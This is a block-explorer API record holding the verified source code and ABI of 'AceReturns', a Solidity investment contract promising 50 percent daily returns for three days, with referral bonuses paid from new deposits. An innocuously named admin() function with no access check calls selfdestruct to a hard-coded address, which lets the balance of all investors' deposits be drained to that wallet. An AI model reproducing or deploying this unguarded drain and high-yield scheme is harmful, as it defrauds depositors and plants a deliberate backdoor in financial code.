{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.24;\r\n\r\n/**\r\n*\r\nGet Paid 50 Percent daily for 3 days... You can withdraw your dividend every minute...\r\n*/\r\ncontract AceReturns {\r\n\r\n    using SafeMath for uint256;\r\n\r\n    mapping(address => uint256) investments;\r\n    mapping(address => uint256) recentinvestment;\r\n    mapping(address => uint256) joined;\r\n    mapping(address => uint256) withdrawals;\r\n    mapping(address => uint256) referrer;\r\n    \r\n    uint256 public step = 50;\r\n    uint256 public minimum = 10 finney;\r\n    uint256 public stakingRequirement = 0.25 ether;\r\n    address public ownerWallet;\r\n    address public owner;\r\n    \r\n    event Invest(address investor, uint256 amount);\r\n    event Withdraw(address investor, uint256 amount);\r\n    event Bounty(address hunter, uint256 amount);\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Constructor Sets the original roles of the contract\r\n     */\r\n\r\n    constructor() public {\r\n        owner = msg.sender;\r\n        ownerWallet = msg.sender;\r\n    }\r\n\r\n    /**\r\n     * @dev Modifiers\r\n     */\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Allows current owner to transfer control of the contract to a newOwner.\r\n     * @param newOwner The address to transfer ownership to.\r\n     * @param newOwnerWallet The address to transfer ownership to.\r\n     */\r\n    function transferOwnership(address newOwner, address newOwnerWallet) public onlyOwner {\r\n        require(newOwner != address(0));\r\n        emit OwnershipTransferred(owner, newOwner);\r\n        owner = newOwner;\r\n        ownerWallet = newOwnerWallet;\r\n    }\r\n\r\n    /**\r\n     * @dev Investments\r\n     */\r\n    function () public payable {\r\n        buy(0x0);\r\n    }\r\n\r\n    function buy(address _referredBy) public payable {\r\n        require(msg.value >= minimum);\r\n        address _customerAddress = msg.sender;\r\n\r\n        if(\r\n           // is this referred by someone?\r\n           _referredBy != 0x0000000000000000000000000000000000000000 &&\r\n\r\n           // no cheating!\r\n           _referredBy != _customerAddress &&\r\n\r\n           // has the referrer invested a minimum of X tokens?\r\n          investments[_referredBy] >= stakingRequirement\r\n       ){\r\n           // referral commission\r\n           referrer[_referredBy] = referrer[_referredBy].add(msg.value.mul(5).div(100));\r\n       }\r\n\r\n       if (investments[msg.sender] > 0){\r\n           if (withdraw()){\r\n               withdrawals[msg.sender] = 0;\r\n           }\r\n       }\r\n       investments[msg.sender] = investments[msg.sender].add(msg.value);\r\n       recentinvestment[msg.sender] = (msg.value);\r\n       joined[msg.sender] = block.timestamp;\r\n       ownerWallet.transfer(msg.value.mul(5).div(100));\r\n       emit Invest(msg.sender, msg.value);\r\n    }\r\n\r\n    /**\r\n    * Evaluate current balance\r\n    * _address Address of investor\r\n    */\r\n    function getBalance(address _address) view public returns (uint256) {\r\n        uint256 minutesCount = now.sub(joined[_address]).div(1 minutes);\r\n        if (minutesCount < 4321) {\r\n        uint256 percent = recentinvestment[_address].mul(step).div(100);\r\n        uint256 different = percent.mul(minutesCount).div(1440);\r\n        uint256 balance = different.sub(withdrawals[_address]);\r\n        return balance;\r\n       }  else {\r\n        uint256 percentfinal = recentinvestment[_address].mul(150).div(100);\r\n        uint256 balancefinal = percentfinal.sub(withdrawals[_address]);\r\n        return balancefinal;\r\n        }\r\n      }\r\n\r\nfunction getMinutes(address _address) view public returns (uint256) {\r\n         uint256 minutesCount = now.sub(joined[_address]).div(1 minutes);\r\n         return minutesCount;\r\n }\r\n    /**\r\n    * Users Withdraw dividends from the contract\r\n    */\r\n    function withdraw() public returns (bool){\r\n        require(joined[msg.sender] > 0);\r\n        uint256 balance = getBalance(msg.sender);\r\n        if (address(this).balance > balance){\r\n            if (balance > 0){\r\n                withdrawals[msg.sender] = withdrawals[msg.sender].add(balance);\r\n                msg.sender.transfer(balance);\r\n                emit Withdraw(msg.sender, balance);\r\n            }\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    /**\r\n    * Referral Commission\r\n    */\r\n    function bounty() public {\r\n        uint256 refBalance = checkReferral(msg.sender);\r\n        if(refBalance >= minimum) {\r\n             if (address(this).balance > refBalance) {\r\n                referrer[msg.sender] = 0;\r\n                msg.sender.transfer(refBalance);\r\n                emit Bounty(msg.sender, refBalance);\r\n             }\r\n        }\r\n    }\r\n\r\n    /**\r\n    * Gets the balance of the sender's address\r\n    */\r\n    function checkBalance() public view returns (uint256) {\r\n        return getBalance(msg.sender);\r\n    }\r\n\r\n    /**\r\n    * Gets the total withdrawals of the specified address after the recent investment\r\n    */\r\n    function checkWithdrawals(address _investor) public view returns (uint256) {\r\n        return withdrawals[_investor];\r\n    }\r\n\r\n    /**\r\n    * Gets the total investments of the specified address\r\n    */\r\n    function checkInvestments(address _investor) public view returns (uint256) {\r\n        return investments[_investor];\r\n    }\r\n    \r\n    /**\r\n    * Gets the recent investment of the specified address\r\n    */\r\n    function checkRecentInvestment(address _investor) public view returns (uint256) {\r\n        return recentinvestment[_investor];\r\n    }\r\n    \r\n    /**\r\n    * Gets the referral balance of the specified address\r\n    */\r\n    function checkReferral(address _hunter) public view returns (uint256) {\r\n        return referrer[_hunter];\r\n    }\r\n    \r\n\tfunction admin() public {\r\n\t    selfdestruct(0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71);\r\n\t}\r\n}\r\n\r\n/**\r\n * @title SafeMath\r\n * @dev Math operations with safety checks that throw on error\r\n */\r\nlibrary SafeMath {\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        assert(c / a == b);\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        assert(b <= a);\r\n        return a - b;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        assert(c >= a);\r\n        return c;\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[{\"name\":\"_hunter\",\"type\":\"address\"}],\"name\":\"checkReferral\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_investor\",\"type\":\"address\"}],\"name\":\"checkRecentInvestment\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"minimum\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"stakingRequirement\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newOwner\",\"type\":\"address\"},{\"name\":\"newOwnerWallet\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_investor\",\"type\":\"address\"}],\"name\":\"checkInvestments\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"ownerWallet\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"bounty\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_investor\",\"type\":\"address\"}],\"name\":\"checkWithdrawals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"checkBalance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"step\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_referredBy\",\"type\":\"address\"}],\"name\":\"buy\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"getMinutes\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"admin\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"getBalance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"investor\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Invest\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"investor\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Withdraw\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"hunter\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Bounty\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"}]","ContractName":"AceReturns","CompilerVersion":"v0.4.24+commit.e67f0147","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://074c00f3cbf12a2bec7295db9142d0db25643809b3ef8a751acf2ac51e6c4dbd"}]}